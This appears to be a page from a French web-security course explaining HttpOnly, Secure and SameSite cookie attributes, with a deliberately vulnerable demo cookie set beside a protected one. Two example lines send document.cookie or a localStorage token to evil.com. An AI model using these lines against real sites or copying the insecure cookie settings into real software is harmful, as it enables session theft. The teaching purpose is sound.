<?php include __DIR__ . '/../../../includes/header.php'; ?>

<div class="page-header">
    <h2>Ch2 — Ex2 : Configuration cookies sécurisée</h2>
    <p>Attributs HttpOnly, Secure, SameSite et leur rôle dans la protection des sessions.</p>
    <span class="duration">25 min</span>
</div>

<div class="card">
    <div class="tabs">
        <button class="tab active" data-tab="vuln">Cookies vulnérables</button>
        <button class="tab secure" data-tab="secure">Cookies sécurisés</button>
    </div>

    <!-- VERSION VULNÉRABLE -->
    <div id="vuln" class="tab-content active">
        <div class="alert alert-danger">
            VULNÉRABLE : Cookies sans attributs de sécurité, accessibles via JavaScript.
        </div>

        <?php
        // Créer un cookie vulnérable pour la démonstration
        setcookie('demo_vuln_session', 'abc123-session-id-en-clair', [
            'path' => '/',
            'httponly' => false,
            'secure' => false,
            'samesite' => 'None',
        ]);
        ?>

        <h3>Cookie vulnérable créé</h3>
        <div class="code-block">
<span class="comment">// PHP — Cookie SANS protection</span>
<span class="vulnerable">setcookie('session_id', 'abc123', [
    'httponly' => false,  // JS peut le lire !
    'secure'  => false,   // Envoyé en HTTP !
    'samesite' => 'None', // Envoyé cross-site !
]);</span>
        </div>

        <h4 style="margin-top:20px;">Démonstration : vol de cookie par XSS</h4>
        <p>Ouvrez la console JavaScript (F12) et tapez :</p>
        <div class="code-block">
<span class="vulnerable">// Lire TOUS les cookies accessibles
console.log(document.cookie);</span>

<span class="comment">// Un attaquant via XSS pourrait faire :</span>
<span class="vulnerable">new Image().src = "https://evil.com/steal?c=" + document.cookie;</span>
        </div>

        <div id="cookie-display" class="result-box" style="margin-top:15px;">
            <p><strong>Cookies lisibles par JavaScript :</strong></p>
            <code id="cookie-value" style="word-break:break-all;"></code>
        </div>

        <hr style="margin:20px 0;">

        <h3>Les 3 problèmes</h3>
        <table>
            <tr><th>Problème</th><th>Conséquence</th><th>Attaque</th></tr>
            <tr>
                <td><code>HttpOnly: false</code></td>
                <td>JavaScript peut lire le cookie</td>
                <td><strong>XSS → vol de session</strong></td>
            </tr>
            <tr>
                <td><code>Secure: false</code></td>
                <td>Cookie envoyé en HTTP (non chiffré)</td>
                <td><strong>Man-in-the-Middle</strong> : interception sur le réseau</td>
            </tr>
            <tr>
                <td><code>SameSite: None</code></td>
                <td>Cookie envoyé avec les requêtes cross-site</td>
                <td><strong>CSRF</strong> : requêtes forgées depuis un autre site</td>
            </tr>
        </table>

        <div class="explanation" style="margin-top:20px;">
            <h4>localStorage vs cookies</h4>
            <p><code>localStorage</code> est <strong>toujours</strong> accessible par JavaScript — il n'a pas d'attribut HttpOnly. Ne stockez <strong>jamais</strong> de tokens de session dans localStorage si vous avez un risque XSS.</p>
        </div>

        <div class="code-block">
<span class="comment">// localStorage est TOUJOURS accessible par JS</span>
<span class="vulnerable">localStorage.setItem('token', 'secret-jwt-token');

// Un XSS peut le voler immédiatement :
var token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token);</span>
        </div>
    </div>

    <!-- VERSION SÉCURISÉE -->
    <div id="secure" class="tab-content">
        <div class="alert alert-success">
            SÉCURISÉ : Cookies avec tous les attributs de protection activés.
        </div>

        <?php
        // Cookie sécurisé (ne fonctionnera pleinement qu'en HTTPS)
        setcookie('demo_safe_session', 'xyz789-session-protegee', [
            'path' => '/',
            'httponly' => true,
            'secure' => false,  // En dev, pas de HTTPS
            'samesite' => 'Strict',
        ]);
        ?>

        <h3>Cookie sécurisé</h3>
        <div class="code-block">
<span class="comment">// PHP — Cookie AVEC protection</span>
<span class="secure">setcookie('session_id', $sessionId, [
    'path'     => '/',
    'httponly'  => true,    // Invisible pour JavaScript
    'secure'   => true,     // HTTPS uniquement
    'samesite' => 'Strict', // Jamais envoyé cross-site
    'expires'  => time() + 3600, // Expire dans 1h
]);</span>
        </div>

        <h3 style="margin-top:20px;">Attributs expliqués</h3>
        <table>
            <tr><th>Attribut</th><th>Valeur</th><th>Protection</th></tr>
            <tr>
                <td><code>HttpOnly</code></td>
                <td><span class="badge badge-secure">true</span></td>
                <td><code>document.cookie</code> ne retourne PAS ce cookie → <strong>anti-XSS</strong></td>
            </tr>
            <tr>
                <td><code>Secure</code></td>
                <td><span class="badge badge-secure">true</span></td>
                <td>Cookie envoyé uniquement sur HTTPS → <strong>anti-interception</strong></td>
            </tr>
            <tr>
                <td rowspan="3"><code>SameSite</code></td>
                <td><span class="badge badge-secure">Strict</span></td>
                <td>Jamais envoyé depuis un autre site → <strong>anti-CSRF total</strong></td>
            </tr>
            <tr>
                <td><span class="badge badge-secure">Lax</span></td>
                <td>Envoyé uniquement pour la navigation (GET top-level)</td>
            </tr>
            <tr>
                <td><span class="badge badge-vuln">None</span></td>
                <td>Envoyé partout (nécessite Secure=true)</td>
            </tr>
        </table>

        <hr style="margin:20px 0;">

        <h3>Configuration PHP des sessions</h3>
        <div class="code-block">
<span class="comment">// php.ini ou dans le code PHP</span>
<span class="secure">ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_lifetime', 3600);</span>

<span class="comment">// Ou via session_set_cookie_params() avant session_start()</span>
<span class="secure">session_set_cookie_params([
    'lifetime' => 3600,
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true,
    'samesite' => 'Strict',
]);
session_start();</span>
        </div>

        <h3 style="margin-top:20px;">Test : cookie HttpOnly invisible</h3>
        <p>Ouvrez la console et tapez <code>document.cookie</code> : le cookie <code>demo_safe_session</code> n'apparaît PAS car il est HttpOnly.</p>
        <p>Mais il apparaît dans DevTools → Application → Cookies (avec un cadenas).</p>
    </div>
</div>

<div class="card">
    <h3>Exercices</h3>
    <ol style="margin:10px 0 0 20px;">
        <li>Ouvrez la console F12 et tapez <code>document.cookie</code> → vous voyez <code>demo_vuln_session</code> mais PAS <code>demo_safe_session</code></li>
        <li>Allez dans DevTools → Application → Cookies → vous voyez les DEUX cookies avec leurs attributs</li>
        <li>Identifiez quel cookie a le drapeau HttpOnly coché</li>
        <li><strong>Défi :</strong> Si vous utilisiez <code>localStorage.setItem('token', 'secret')</code>, un XSS pourrait-il le voler ?</li>
    </ol>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    var el = document.getElementById('cookie-value');
    if (el) {
        el.textContent = document.cookie || '(aucun cookie lisible par JS)';
    }
});
</script>

<a href="index.php" class="btn btn-primary">← Retour au chapitre 2</a>

<?php include __DIR__ . '/../../../includes/footer.php'; ?>
